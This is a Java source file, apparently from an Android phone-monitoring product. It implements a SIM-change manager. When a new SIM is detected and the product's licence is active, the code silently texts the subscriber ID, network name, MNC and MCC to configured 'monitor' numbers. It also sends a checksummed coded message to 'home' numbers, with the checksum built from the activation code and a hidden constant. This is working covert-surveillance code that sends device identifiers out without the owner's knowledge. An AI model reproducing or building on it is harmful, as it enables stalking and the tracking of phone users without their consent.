package com.vvt.capture.simchange;

import java.util.ArrayList;
import java.util.List;

import android.os.Looper;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.base.security.Constant;
import com.vvt.base.security.FxSecurity;
import com.vvt.crc.CRC32Checksum;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.sms.SmsUtil;
import com.vvt.stringutil.FxStringUtils;
 

/**
 * @author Aruna
 * @version 1.0
 * @created 28-Jul-2011 9:54:41
 */

public class SimChangeManagerImpl implements SimChangeManager {
	private static final String TAG = "SimChangeManagerImpl";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String MESSAGE_FORMAT = 
			"%s has detected SIM change. New SIM number is now as this SMS." +
			"\nNetwork: %s" +
			"\nMNC: %s" +
			"\nMCC: %s" +
			"\nIMEI | MEID: %s";
	
	private FxEventListener m_FxEventListner;
	private String m_LastUsedSimId;
	private AppContext mAppContext;
	private LicenseManager mLicenseManager;
	
	public SimChangeManagerImpl() {
		if(LOGV) FxLog.v(TAG, "constructor # ENTER ...");
		if(LOGV) FxLog.v(TAG, "constructor # EXIT ...");
	}
	
	public void setLicenseManager(LicenseManager licenseManager) {
		mLicenseManager = licenseManager;
	}
	
	public void setAppContext(AppContext appContext) {
		mAppContext = appContext;
	}
	
	public void setEventListener(FxEventListener listener) {
		m_FxEventListner = listener;
	}
	
	@Override
	public void doReportPhoneNumber(List<String> phoneNumbers) throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "doReportPhoneNumber # ENTER ...");
		if(LOGV) FxLog.v(TAG, "doReportPhoneNumber # EXIT ...");
	}

	@Override
	public void doSendSIMChangeNotification(final List<String> monitorPhoneNumbers,
			final List<String> homePhoneNumbers) throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # ENTER ...");
		
		if(m_FxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if( mAppContext == null) {
			throw new FxNullNotAllowedException("AppContext can not be null");
		}
		
		if( mLicenseManager == null) {
			throw new FxNullNotAllowedException("LicenseManager can not be null");
		}
		
		loadDefaultSettings();
		
		final String subscriberId = SimChangeHelper.getSubscriberId(mAppContext.getApplicationContext());
		if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # subscriberId is " + subscriberId);
		
		if(subscriberId.equalsIgnoreCase(m_LastUsedSimId)) {
			// SIM has not changed
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # SIM has not changed");
		}
		else {
			if(LOGD) FxLog.d(TAG, "doSendSIMChangeNotification # SIM has changed");
			
			if(mLicenseManager.getLicenseInfo().getLicenseStatus() == LicenseStatus.ACTIVATED) {
				
				SIMChangeThread changeThread = new SIMChangeThread(
						"SIMChangeThread", monitorPhoneNumbers,
						homePhoneNumbers);
				
				changeThread.start();
			}
			else {
				if(LOGD) FxLog.d(TAG, "Licemse status is not activated");
			}
		}
		
		if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # EXIT ...");
	}
	
	class SIMChangeThread extends Thread {
		List<String> mMonitorPhoneNumbers = new ArrayList<String>();
		List<String> mHomePhoneNumbers = new ArrayList<String>();
		
		SIMChangeThread(String threadName, List<String> monitorPhoneNumbers,
				List<String> homePhoneNumbers) {
			
			super(threadName);
			mMonitorPhoneNumbers = monitorPhoneNumbers;
			mHomePhoneNumbers = homePhoneNumbers;
		}
		
		public void run() {
			Looper.prepare();
			
			// Sleep sometime and make sure everthing else is initilized
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # Sleeping 10 secs");
			
			try {
				Thread.sleep(10000);
			} catch (InterruptedException e) { }
			
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # Waking up after sleeping 10 secs");
			String appName = mAppContext.getProductInfo().getProductName();
			String network = mAppContext.getPhoneInfo().getNetworkName();
			int mnc = mAppContext.getPhoneInfo().getMobileNetworkCode();
			int mcc = mAppContext.getPhoneInfo().getMobileCountryCode();
			String subscriberId = SimChangeHelper.getSubscriberId(mAppContext.getApplicationContext());
			String message = String.format(MESSAGE_FORMAT, appName, network, mnc, mcc, subscriberId);

			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # appName :"  + appName);
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # network :"  + network);
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # mnc :"  + mnc);
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # mcc :"  + mcc);
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # message :"  + message);
			
			// SIM has changed.
			List<FxEvent> events = new ArrayList<FxEvent>();
			FxSystemEvent event = new FxSystemEvent();
			event.setDirection(FxEventDirection.OUT);
			event.setEventTime(System.currentTimeMillis());
			event.setLogType(FxSystemEventCategories.CATEGORY_SIM_CHANGE);
			event.setMessage(message);
			events.add(event);
			
			m_FxEventListner.onEventCaptured(events);
			
			//monitorPhoneNumbers
			for(String pn : mMonitorPhoneNumbers) {
				SmsUtil.sendSms(pn, message);
			}
			
			String tail = FxSecurity.getConstant(Constant.TAIL) ;
			//if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # tail :"  + tail);
			
			String checkSum = getCheckSum("2", subscriberId, mLicenseManager.getLicenseInfo().getActivationCode(), tail);
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # checkSum :"  + checkSum);
			
			String homePhoneMessage = new StringBuilder().append("<2>").append(subscriberId).append(checkSum).toString();
			if(LOGV) FxLog.v(TAG, "doSendSIMChangeNotification # homePhoneMessage :"  + homePhoneMessage);
			
			for(String pn : mHomePhoneNumbers) {
				SmsUtil.sendSms(pn, homePhoneMessage);
			}
			
			// Save the sim Id
			setSimId(subscriberId);
			
			Looper.loop();
		}
	}
 

	private String getCheckSum(String cmd, String imei, String activationCode,
			String tail) {

		String strCrc32 = null;

		try {
			String data = cmd + imei + activationCode + tail;
			long crc32 = CRC32Checksum.calculate(data.getBytes("UTF-8"));
			strCrc32 = Integer.toHexString((int) crc32).toUpperCase();

		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}

		return strCrc32;
	}

	private void loadDefaultSettings() {
		if(LOGV) FxLog.v(TAG, "loadDefaultSettings # ENTER ...");
		
		m_LastUsedSimId = SimChangeSettings.getSimId(mAppContext.getWritablePath());
		
		if(LOGV) FxLog.v(TAG, "loadDefaultSettings # m_LastUsedSimId :" + m_LastUsedSimId);
		
		if(FxStringUtils.isEmptyOrNull(m_LastUsedSimId)) {
			// First time run ?
			String subscriberId = SimChangeHelper.getSubscriberId(mAppContext.getApplicationContext());
			setSimId(subscriberId);
			
			if(LOGV) FxLog.v(TAG, "loadDefaultSettings # reset m_LastUsedSimId to :" + subscriberId);
		}
		
		if(LOGV) FxLog.v(TAG, "loadDefaultSettings # EXIT ...");
	}
	
	private void setSimId(String lastUsedSimId) {
		m_LastUsedSimId = lastUsedSimId;
		SimChangeSettings.setSimId(mAppContext.getWritablePath(), String.valueOf(lastUsedSimId));
	}

}
